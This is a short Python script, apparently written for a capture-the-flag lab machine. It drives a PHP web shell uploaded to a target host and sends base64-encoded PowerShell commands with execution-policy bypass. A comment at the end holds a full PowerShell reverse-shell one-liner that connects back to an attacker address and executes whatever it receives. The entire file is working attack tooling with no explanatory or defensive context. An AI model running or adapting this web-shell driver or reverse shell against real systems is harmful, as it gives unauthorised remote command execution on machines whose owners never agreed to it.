#!/usr/bin/python3

import requests
import base64

url = 'http://10.10.10.228/portal/uploads/12323.php?1=shell_exec&2=powershell.exe -ep bypass -nop -encode '

while True:
    a = input("~$ ")
    a = base64.b64encode(a.encode('UTF_16LE')).decode()
    print(a)
    
    r = requests.get(url + a)
    print (r.text)
    

# $client = New-Object System.Net.Sockets.TCPClient("10.10.14.76",8080);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};
